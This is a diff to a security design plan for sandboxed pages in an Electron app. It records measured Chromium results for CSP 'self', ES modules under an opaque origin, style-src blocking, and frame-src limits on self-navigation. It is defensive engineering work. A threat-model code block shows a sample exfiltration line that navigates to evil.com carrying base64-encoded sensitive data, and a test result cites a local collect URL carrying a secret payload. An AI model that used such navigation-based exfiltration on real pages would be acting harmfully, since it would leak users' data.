@@ -18,6 +18,13 @@ a language switcher, and a contact form.
 > immutable revision directories. Catalog mutations serialized. Host/Origin/CORS hardening added.
 > Bundled-skill destination corrected. **WS7 scope narrowed: live-data pages are in-app only** —
 > see §2.5 for why this was unavoidable.
+> **r4** (WS0 spike executed) — §2.4/§2.5 are now MEASURED against Chromium, not argued. Four changes:
+> (a) CSP `'self'` works — the r2/r3 explicit-origin workaround is dropped; (b) framed self-navigation
+> is blocked by the **wrapper's `frame-src`**, a browser-native control r3 missed, with `webRequest`
+> demoted to a second layer for top-level loads; (c) **ES modules do not execute** from an opaque
+> origin — classic scripts only; (d) `style-src 'self'` blocks `<style>`/`style=` but permits CSSOM.
+> Consequence: live-data pages must always be **framed**, never top-level, including in-app.
+> Evidence: `spike/ws0-pages-security/FINDINGS.md`.
 
 ---
 
@@ -125,24 +132,47 @@ remounting an iframe at the same URLs busts only the top-level document, leaving
 `app.js` stale, which is precisely the "make the header blue does nothing" failure. Old revisions are
 pruned on a retention policy; the pointer is the only mutable state.
 
-### 2.4 Opaque-origin consequences (corrected)
+### 2.4 Opaque-origin consequences (corrected, then measured)
 
-Dropping `allow-same-origin` gives the page an opaque origin. **This does not break CSP `'self'`.** A
-header-delivered policy's self-origin is derived from the **response URL** at parse time
+> **WS0 outcome.** Everything in this section and §2.5 has now been **run**
+> against Chromium (Electron 39.2.7). See `spike/ws0-pages-security/FINDINGS.md`.
+> Four results changed the design: `'self'` works (this section was wrong in r2);
+> framed self-navigation is blocked by the wrapper's `frame-src`, not by
+> `webRequest`; ES modules do not execute from an opaque origin; and
+> `style-src 'self'` blocks `<style>` and `style=` but permits CSSOM writes.
+
+Dropping `allow-same-origin` gives the page an opaque origin. **This does not break CSP `'self'`** —
+verified in WS0: an external stylesheet applied and a classic script executed under `'self'`. A
+header-delivered policy's self-origin comes from the **response URL** at parse time
 ([W3C CSP §parse-response-csp](https://www.w3.org/TR/CSP/#parse-response-csp)), not from the
-document's subsequently-opaque origin — so `script-src 'self'` and `style-src 'self'` resolve against
-`http://127.0.0.1:{port}` and work. (The widely-repeated "`'self'` matches nothing when sandboxed"
-folklore applies to **meta**-delivered policies inside an already-opaque document, and to `srcdoc`/
-`data:` frames. It does not apply here. An earlier revision of this plan asserted otherwise.)
+document's subsequently-opaque origin. (The "`'self'` matches nothing when sandboxed" folklore applies
+to **meta**-delivered policies inside an already-opaque document, and to `srcdoc`/`data:` frames. An
+earlier revision of this plan asserted otherwise and was wrong.)
 
 What *does* change, because these are origin-derived rather than CSP-derived:
 
-| Consequence | Implication |
+| Consequence | Measured behaviour |
 |---|---|
-| **`event.origin` is the string `"null"`** | The wrapper **must** authenticate by `event.source === frame.contentWindow`. Never compare origins (never matches), never accept `origin === 'null'` (every sandboxed frame produces it). |
-| **`localStorage` / IndexedDB throw** | No client-side persistence. Service workers cannot register. The skill teaches in-memory state. |
-| **Relative paths still work** | The document *URL* is unchanged; only the origin is opaque. Multi-page navigation and relative assets resolve normally. |
-| **No `allow-forms`** | Real `<form>` submission is blocked — this is how "visual only" is *enforced*. It fails with a console error and looks broken, so the skill teaches click handlers, not `<form>` submit. |
+| **`event.origin` is the string `"null"`** | Confirmed. The wrapper **must** authenticate by `event.source === frame.contentWindow`; a forged message with the wrong source was correctly rejected. Never compare origins (never matches), never accept `origin === 'null'` (every sandboxed frame produces it). |
+| **`localStorage` throws** | Confirmed — `SecurityError`. |
+| **`document.cookie` throws** | **Stronger than predicted**: r2 expected an empty string; it throws `SecurityError`. |
+| **ES modules do NOT execute** | **Not anticipated.** `<script type="module">` silently fails with *no CSP violation* — module scripts fetch in CORS mode, which is cross-origin from an opaque origin. Verified: adding `Access-Control-Allow-Origin: *` makes them work. **Decision: classic scripts only**, no ACAO header — it would let any site that learns the port and pageId read page content. |
+| **Relative paths still work** | Confirmed. The document *URL* is unchanged; only the origin is opaque. |
+| **`connect-src 'none'` blocks the page's OWN JSON** | Confirmed. Page data must ship as executed JS assigning a global, not as fetched JSON. |
+| **No `allow-forms`** | Confirmed — submission produced no navigation. This is how "visual only" is *enforced*. It fails silently, so the skill teaches click handlers, not `<form>` submit. |
+
+**`style-src 'self'` — the open decision, now closed by measurement:**
+
+| Technique | Result | Violation |
+|---|---|---|
+| `<style>` block | blocked | `style-src-elem` |
+| `style="..."` attribute | blocked | `style-src-attr` |
+| `el.setAttribute('style', …)` | blocked | `style-src-attr` |
+| `el.style.color = …` (CSSOM) | **allowed** | — |
+
+Keep `style-src` strict. Styling goes in an external stylesheet; dynamic styling uses CSSOM. The skill
+must forbid inline `<style>` and `style=` attributes — a model emits both by habit and they fail
+*silently* (unstyled element, no error).
 
 Because `connect-src 'none'` also blocks `fetch()` of the page's own JSON assets, data files must be
 delivered as JS (`app-data.js` assigning a global) rather than fetched JSON. WS0 verifies this.
@@ -157,15 +187,27 @@ Assume the full header policy is applied: `connect-src 'none'` (no fetch/XHR/Web
 location.href = 'https://evil.com/?d=' + btoa(sensitiveData)
 ```
 
-**A document navigating its own frame is not restricted by any sandbox flag, and no CSP directive
-covers it.** `navigate-to` was proposed for exactly this case and **removed from CSP3 — it never
-shipped in any browser.** The header-sandbox does not close it either: a top-level sandboxed document
-can still navigate itself.
+**A document navigating its own frame is not restricted by any sandbox flag**, and `navigate-to` was
+proposed for exactly this case and **removed from CSP3 — it never shipped in any browser.**
 
-The only effective control is at the network layer, and it exists **only in-app**: a dedicated
-Electron session partition for pages, with `session.webRequest.onBeforeRequest` default-denying every
-request whose URL is not `http://127.0.0.1:{pagesPort}`. That cancels navigations and subresources
-outright — strictly stronger than CSP. In a third-party browser, no equivalent exists.
+WS0 measured this and found **two** controls, not one. The r2 text below claimed `webRequest` was the
+only one; that was wrong.
+
+| Context | Self-navigation off-origin | What stopped it |
+|---|---|---|
+| Framed in the wrapper | **blocked** (`ERR_BLOCKED_BY_CSP`) | the **wrapper's `frame-src 'self'`** — the embedding document governs where a child frame may navigate |
+| Top-level document | **succeeded**, reached the network | nothing |
+| Top-level + `webRequest` deny | **blocked** (`ERR_BLOCKED_BY_CLIENT`) | Electron network layer |
+
+`frame-src` is the better control: browser-native, no Electron dependency, works in any engine. The
+Electron partition deny is a second layer for the top-level case.
+
+The top-level result confirms the split. Loaded directly, the sandboxed page navigated itself to
+`http://127.0.0.1:9999/collect?d=SECRET_PAYLOAD` and genuinely attempted the connection.
+
+**Stronger consequence than r2 stated:** a live-data page must **always be viewed framed inside the
+wrapper**, never as a top-level document — *including in-app*. An "open in the browser pane" action on
+a live-data page is a top-level load and forfeits the `frame-src` protection.
 
 **Therefore the capability splits on a property the app can check — does this page hold grants?**
 
